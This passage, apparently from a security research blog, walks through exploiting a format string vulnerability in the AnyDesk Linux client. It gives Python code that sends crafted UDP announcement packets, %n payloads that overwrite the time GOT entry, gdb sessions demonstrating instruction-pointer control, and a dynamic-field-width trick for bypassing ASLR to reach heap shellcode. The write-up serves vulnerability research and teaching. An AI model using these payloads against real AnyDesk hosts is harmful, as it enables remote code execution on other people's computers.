       int snprintf(char *str, size_t size, const char *format, ...);

       #include <stdarg.h>

       int vprintf(const char *format, va_list ap);
       int vfprintf(FILE *stream, const char *format, va_list ap);
       int vdprintf(int fd, const char *format, va_list ap);
       int vsprintf(char *str, const char *format, va_list ap);
       int vsnprintf(char *str, size_t size, const char *format, va_list ap);

```

The structure of `va_list` is actually specific to the `Application Binary Interface` (`ABI`), which e.g. describes the calling convention, how the stack is organized and so on. On `x86`, where all function parameters are passed on the stack, `va_list` simply consists of a pointer to the stack area, where the original parameters are stored. With `x64` things get a little bit more complex. The first six parameters are passed in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), also there are special registers for floating point parameters (`XMM0` … `XMM7`). Additional parameters are passed on the stack as with `x86`. There is a very good blog post describing the details, which can be found [here](https://blog.nelhage.com/2010/10/amd64-and-va_arg/). The structure of the `va_list` looks like this on `x64`:

```

typedef struct {
  unsigned int gp_offset;
  unsigned int fp_offset;
  void *overflow_arg_area;
  void *reg_save_area;
} va_list[1];

```

There are two pointers: `overflow_arg_area`, which points to the first argument originally passed on the stack and `reg_save_area`, which points to an area on the stack where the arguments passed via registers are saved (the first six general parameters as well as eight floating point parameters). Both values `gp_offset` and `fp_offset` are offsets relative to `reg_save_arena` and reference the first general register parameter (`gp_offset`) as well as the first floating point parameter (`fp_offset`). These offsets exists because there are usually other parameters before the variable parameters (e.g. the format string itself).

Let’s have a practical look at this on the AnyDesk front-end. We attach gdb to it and set a breakpoint on the call to `vsnprintf`:

```

user@w00d:~$ sudo gdb /usr/bin/anydesk $(~/pid_frontend.py)
...
Attaching to program: /usr/bin/anydesk, process 3863
...
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

Now we can use the python function again, which we created to generate announcement frames. In this case we send an announcement with the following hostname:

```

p = gen_discover_packet(4919, 1, '\x85\xfe 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

The beginning of the hostname (`'\x85\xfe'`) is an invalid UTF-8 sequence, which will trigger the format string vulnerability (any other invalid UTF-8 sequence can be used here). After this we use the `%p` format specifier to print the values of the first ten arguments.

A few seconds after running the script (up to 5 seconds until the GUI refreshes) our breakpoint is hit:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffff81
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453d80 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0016| 0x7ffffffeab00 --> 0x158cba0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138ca30 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1572280 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$

```

The fourth parameter (`RCX = 0x7ffffffeb898`) is the `va_list` structure. The first two unsigned ints (4 bytes each) are the members `gp_offset` and `fp_offset`:

```

gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030

```

After these values both pointers `overflow_arg_area` and `reg_save_area` follow:

```

gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0

```

Since the value of `gp_offset` is 0x10, the function which was originally called with variable arguments had two preceding general parameters. In order to display the next four general parameters assumed to be passed in the remaining registers, we need to add `gp_offset` (`0x10`) to the `reg_save_area` pointer (`0x00007ffffffeb8b0`):

```

gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001453d80	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

`vsnprintf` assumes that these four values were passed in registers. All following values are assumed to be passed via the stack and are referenced by the `overflow_arg_area` pointer (`0x00007ffffffeb970`):

```

gdb-peda$ x/6xg 0x00007ffffffeb970
0x7ffffffeb970:	0x0000000000b366d8	0x0000000000000000
0x7ffffffeb980:	0x0000000001482b01	0x00007ffff5e4ee24
0x7ffffffeb990:	0x0000000001453d80	0x0000000000000000

```

By entering `ni` the call to `vsnprintf` is made and we can inspect the resulting string (`set print elements 0` displays the whole string without truncation):

```

gdb-peda$ ni
...
gdb-peda$ set print elements 0
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.0x1453d80 2.(nil) 3.0x7ffff1784c40 4.0x10 5.0xb366d8 6.(nil) 7.0x1482b01 8.0x7ffff5e4ee24 9.0x1453d80 10.(nil)'"

```

The first four parameters were indeed taken from the `reg_save_area` and all following values from the `overflow_arg_arena`. The following picture summarizes the structure:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_05-1.png)

## Gaining arbitrary write

After we have clarified what we can access with the format string, we need to find some data that we can control in the accessible data. If we can directly control data within the `reg_save_area` or `overflow_arg_area`, we could store the address of the `time GOT` entry and write to it using the `%n` format specifier.

Within the `reg_save_area` there are only 4 values we can access. These do obviously not contain any data of our input. All following parameters are stored in the `overflow_arg_area`. Let’s have a look at the first 50 values stored there using the `telescope` command:

```

gdb-peda$ telescope 0x00007ffffffeb970 50
0000| 0x7ffffffeb970 --> 0xb366d8 --> 0x62696c67 ('glib')
0008| 0x7ffffffeb978 --> 0x0
0016| 0x7ffffffeb980 --> 0x1530801 --> 0xe000007ffff17853
0024| 0x7ffffffeb988 --> 0x7ffff5e4ee24 (test   eax,eax)
0032| 0x7ffffffeb990 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0040| 0x7ffffffeb998 --> 0x0
0048| 0x7ffffffeb9a0 --> 0x10
0056| 0x7ffffffeb9a8 --> 0x7ffff5e501cd (<g_logv+605>:	mov    eax,r14d)
0064| 0x7ffffffeb9b0 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0072| 0x7ffffffeb9b8 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0080| 0x7ffffffeb9c0 --> 0x1fffeb9d0
0088| 0x7ffffffeb9c8 --> 0x4342b0 (push   rbp)
0096| 0x7ffffffeb9d0 --> 0x0
0104| 0x7ffffffeb9d8 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0120| 0x7ffffffeb9e8 --> 0x0
0128| 0x7ffffffeb9f0 --> 0x155dd20 --> 0x7fffdc00f3d0 --> 0x1514300 --> 0x1513da0 --> 0x14d6e00 (--> ...)
0136| 0x7ffffffeb9f8 --> 0x0
0144| 0x7ffffffeba00 --> 0x500000000
0152| 0x7ffffffeba08 --> 0x7ffff5e9acd8 ("Invalid UTF-8 encoded text in name - not valid '%s'")
0160| 0x7ffffffeba10 --> 0x0
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0176| 0x7ffffffeba20 --> 0x7ffff5e969e1 --> 0x4600303262696c67 ('glib20')
...

```

We can see a few occurrences of the heap address of the format string. Although we control parts of the format string, we don’t control the address, which is what we would need to. Searching even further down the stack for possible data we can control does not yield anything useful. So it seems that we can’t control any data, which we can access with the format string. Is this already a dead end? Of course not!

Taking a look at the values above again, we can see that there are stack addresses stored on the stack. There are even stack addresses, which reference the area we can access. For example at offset `112` the stack address `0x7ffffffeba18` is stored, which corresponds to offset `168`:

```

...
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...

```

If we use the appropriate argument selector we can use this stack address to write to the area we can access. We can then use another argument selector to reference the data we wrote. The following picture visualizes the basic idea:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_06-1.png)

The problem here is that we cannot do this in a single call of `vsnprintf`. All referenced data is fetched **before** data is written by the `%n` format specifier. This means that the `%19$ln` would indeed overwrite the data on the stack, but the `%26$ln` would still evaluate to the old value, which was stored there. Accordingly we need two calls:

1. Store address of `time` `GOT` entry on the stack
2. Write to previously stored `GOT` entry address in order to control instruction pointer

As you may remember, the vulnerable call to `vsnprintf` is actually made twice for the very same format string. Though it turned out that the call path for both of these calls vary. Because of this also the stack layout varies. This means that an argument selector (e.g. `%26$ln`) on the first call will not reference the same value on the second call. We also need to keep in mind that we cannot change the format string in-between the two calls. If we e.g. use `%200$n` on the first call, to write the `GOT` address on the stack, we need to ensure that `%200$n` on the second call also references a writable address, because we trigger a segmentation fault otherwise. This is not only true for `%n` we use to store the `GOT` address but also for the second `%n`, we need to use in order to actually write to the `GOT` entry. Unfortunately there did not seem to be any values on the stack, which would fulfill these requirements.

Thus we need another approach. The first thing that came into my mind was to send two independent announcement frames. We need to trigger the vulnerability twice, so let’s just trigger it twice via the initial attack vector. Because of the duplicate call this actually results in four calls to `vsnprintf`. We still must ensure that the `%n` used on the respective first call also references a writable memory location on the associated second call, but since we only need to use one `%n` format specifier in each pair of calls, stack values can be found to fulfill this requirement.

Although the approach using two separate announcement frames seemed to work, I did not really like it. One reason for this is the duplicate call of `vsnprintf`. We must accept that the second call writes somewhere into memory even though it is not relevant for our exploit. Also the two announcement frames may interfere with legitimate announcement frames, which are sent in the same time window (the GUI gets updated only every 5 seconds). These aspects may reduce the reliability of the exploit.

While thinking about this and looking at the GUI another idea came into my mind:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

The GUI displays not only the hostname, but also the username. So far we triggered the vulnerability only by using the hostname. But the username should also be prone to this. Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %p', '\x85\xfeUSERNAME %p', 'ad', 'main')

```

After a few seconds the GUI updates and the breakpoint on the `vsnprintf` call is hit:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

Inspecting the format string (third parameter) we can see that the username indeed triggered the vulnerability. After continuing the execution the breakpoint is hit again:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

This time the vulnerability was triggered by the hostname. If we further continue the execution both calls (for username and hostname) are repeated.

Thus we verified that the vulnerability can be triggered using both the hostname and the username. This is a good news for our exploit because we can now use two independent format strings, which are sent in a single UDP packet and are both evaluated before the duplicate call is triggered.

What we have to do now is to find an accessible stack address, which we will write the `GOT` address to. For this we must keep in mind that the values on the stack between the two `vsnprintf` calls may change / get overwritten. If we write to an stack address, which is too near to the top of the stack, it is very likely that it has been overwritten at the time of the second call. Finding a suitable value is only a matter of try and error. We write to an address on the first call and then verify that the value we wrote is still the same on the second call.

The stack address `0x7ffffffebe70`, which can be accessed using the argument selector `%93$ln` fits our needs:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 2, 0x00000000008ab346 in ?? ()
gdb-peda$ telescope 0x00007ffffffeb970 100
...
0704| 0x7ffffffebc30 --> 0x7ffffffebe70 --> 0x6ffffec070
...

```

After the first call the value `0x90` (the characters written so far) is written to `0x7ffffffebe70`:

```

gdb-peda$ ni
...
[-------------------------------------code-------------------------------------]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
   0x8ab346:	call   0x412d90 <vsnprintf@plt>
=> 0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
   0x8ab35c:	call   0x4123d0 <gettimeofday@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000008ab34b in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

When the breakpoint is hit again on the second call, the value is still the same:

```

gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2249 ('I"')
0008| 0x7ffffffeaaf8 --> 0x2bc
0016| 0x7ffffffeab00 --> 0x158c710 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbad94
0032| 0x7ffffffeab10 --> 0x5ecbad94
0040| 0x7ffffffeab18 --> 0xab240
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

On the second call we can access the value using the argument selector `%165$p` (offset `1280`):

```

gdb-peda$ telescope 0x00007ffffffeb970 200
...
1280| 0x7ffffffebe70 --> 0x90
...

```
## Controlling the instruction pointer

Now we are finally ready to overwrite the `GOT` entry of `time`. At first let’s determine the address of the `GOT` entry:

```

gdb-peda$ p/x &'time@got.plt'
$1 = 0x119ddc0

```

Accordingly the `GOT` entry of `time` is stored at `0x119ddc0`. In order to write this value, we can pad the output of `vsnprintf` accordingly using a `field width`. If you are not familiar with this, please refer to my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B). The error message itself (`Failed to set text from markup ...`) contains 133 characters. Also we need to add two characters for an invalid UTF-8 sequence. Thus we have to pad the output to `18472249` characters:

```

0x119ddc0 = 18472384 (time GOT)
18472384 - 133 - 2 = 18472249

```

Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %165$p', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After the first call to `vsnprintf` the target stack address (`0x7ffffffebe70`) actually contains the `GOT` address of `time`:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 52: Invalid UTF-8 encoded text in name - not valid '\205\376%18472249x%93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000006ffffec070
gdb-peda$ ni
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x000000000119ddc0

```

The `%165$p` format specifier on the second call successfully references the `GOT` address:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ ni
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME 0x119ddc0'"

```

The next step is to replace the `%p` format specifier with `%ln` in order to write a 8 byte value to the `GOT` entry on the second call. This way we should be able to control the instruction pointer, when the call to `time` is triggered after the `vsnprintf` call. Let’s verify this by writing the value `0x1337`:

```

0x1337 = 4919
4919 - 133 - 2 = 4784

```

This time we adjust the hostname accordingly:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%4784x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame and continuing to the second call to `vsnprintf`, to `GOT` entry of `time` is still untouched:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0008| 0x7ffffffeaaf8 --> 0x357
0016| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbb8cc
0032| 0x7ffffffeab10 --> 0x5ecbb8cc
0040| 0x7ffffffeab18 --> 0xd0f51
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

By executing the `vsnprintf` call the value `0x1337` is successfully written:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000000001337

```

If we now continue the execution, the immediately following call to `time` raises a segmentation fault with the instruction pointer being `0x1337`:

```

gdb-peda$ c
Continuing.

Thread 1 "anydesk" received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x1338
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x0
RDX: 0x0
RSI: 0x7ffff1784ca0 --> 0x16c1400 --> 0x276e00 ('')
RDI: 0x7ffffffeab08 --> 0x5ecbb8cc
RBP: 0x5
RSP: 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
RIP: 0x1337
R8 : 0x1
R9 : 0x6e ('n')
R10: 0x1
R11: 0xa ('\n')
R12: 0x7ffffffeb898 --> 0x3000000018
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453ea0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
R15: 0x4
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x1337
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaae8 --> 0x8ab355 (lea    rdi,[rsp+0x20])
0008| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0016| 0x7ffffffeaaf8 --> 0x357
0024| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0032| 0x7ffffffeab08 --> 0x5ecbb8cc
0040| 0x7ffffffeab10 --> 0x5ecbb8cc
0048| 0x7ffffffeab18 --> 0xd0f51
0056| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000001337 in ?? ()

```

We successfully control the instruction pointer.

## Hitting our shellcode: dynamic field width

At next we must decide where we want to point the instruction pointer to. At the very beginning we figured out, that the security mechanisms of the binary are quite weak. Actually the heap, where the format string we control is stored, is executable:

```

gdb-peda$ vmmap 0x1453ea0
Start              End                Perm	Name
0x011c4000         0x017c8000         rwxp	[heap]

```

This means that we can store a shellcode within the format string and redirect the instruction pointer to this shellcode. Though we need to keep in mind that we manually disabled ASLR and in fact don’t know any heap address. A common approach to bypass ALSR is to leak a memory address. Especially for basic format string vulnerabilities this is an easy to achieve goal. In this case however we don’t get any response from the application. The result of the format string is written to the log file, which we don’t have access to. Thus we cannot leak any heap address.

Nevertheless we can successfully bypass ASLR using a `dynamic field width`. Since this does not seem to be very well-known, let’s have a look at a short example. We have already used the ordinary `field width` in order to pad the output effectively increasing the amount of characters written, which makes `%n` write a bigger value:

```

user@w00d:~$ cat sample1.c
#include <stdio.h>

int main() {

  int out;
  printf("%100x%1$n", &out);
  printf("\nout = %d\n", out);

  return 0;
}

```

The `%100x` format specifier prints the first argument as a hexadecimal number, which is padded to 100 characters. Accordingly 100 characters are written. This amount will be written to the `out` variable by using the `%1$n` format specifier:

```

user@w00d:~$ ./sample1
                                                                                            ffffded4
out = 100

```

In this case the `field width` was statically set to `100`. But we can also use a `dynamic field width`:

```

user@w00d:~$ cat sample2.c
#include <stdio.h>

int main() {

  int out;
  int field_width = 123;
  printf("%1$*2$x%1$n", &out, field_width);
  printf("\nout = %d\n", out);

  return 0;
}

```

We introduced a new variable called `field_width`, which is passed as the second argument to `printf`. Also we changed the `%100x` format specifier to `%1$*2$x`. At first the syntax might look a little bit confusing, but actually it is quite simple: The `1$` at the beginning determines, which value we want to print. In this case we just take the first argument, just like the `%100x` did (4 byte of `out` address). This is separated by an asterisk (`*`) from the second part: `2$`. This determines which value should be used for the field width. In this case the variable `field_width`, which is the second argument. Accordingly when running the program the value of `field_width` (`123`) is written to the variable `out`:

```

user@w00d:~$ ./sample2
                                                                                                                   ffffded0
out = 123

```

After this short introduction to the dynamic field width, let’s see how we can leverage this feature.

When inspecting all accessible parameters on the second call to `vsnprintf` (hostname), we can see that we can access the heap address of the format string. The `reg_save_area` is stored at `0x00007ffffffeb8b0`. The value of `gp_offset` is `0x10`, which means the first argument we can access is stored at `0x00007ffffffeb8b0 + 0x10 = 0x00007ffffffeb8c0`:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
